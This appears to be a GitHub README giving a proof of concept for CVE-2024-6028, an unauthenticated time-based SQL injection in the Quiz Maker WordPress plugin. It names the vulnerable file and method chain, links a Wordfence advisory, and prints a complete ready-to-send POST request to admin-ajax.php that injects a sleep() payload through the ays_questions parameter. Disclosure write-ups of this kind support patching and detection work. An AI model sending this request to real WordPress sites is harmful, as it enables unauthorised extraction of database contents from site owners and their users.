# CVE-2024-6028-Poc
CVE-2024-6028 Quiz Maker &lt;= 6.5.8.3 - Unauthenticated SQL Injection via 'ays_questions' Parameter

## Description
The Quiz Maker plugin for WordPress is vulnerable to time-based SQL Injection via the 'ays_questions' parameter in all versions up to, and including, 6.5.8.3 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/quiz-maker/quiz-maker-6583-unauthenticated-sql-injection-via-ays-questions-parameter

File: wp-content/plugins/quiz-maker/public/class-quiz-maker-public.php

Class: Quiz_Maker_Public

Workflow: method ays_finish_quiz -> method get_questions_categories
![image](https://github.com/truonghuuphuc/CVE-2024-6028-Poc/assets/20487674/4b2831fa-d6e4-4ce4-b333-406ab4e0b08c)
![image](https://github.com/truonghuuphuc/CVE-2024-6028-Poc/assets/20487674/21791f11-1c1b-4137-9e96-c249172800e5)
![image](https://github.com/truonghuuphuc/CVE-2024-6028-Poc/assets/20487674/6ad46038-4668-4d26-a0c2-1748c7a741db)

## Poc

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: <Host>
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 114

ays_quiz_id=1&ays_quiz_questions=1,2,3&quiz_id=1&ays_questions[ays-question-4)+or+sleep(if(1>0,5,0)]=&action=ays_finish_quiz
```
![image](https://github.com/truonghuuphuc/CVE-2024-6028-Poc/assets/20487674/3ec61ab7-11fd-4320-8073-6cdd550dac1b)
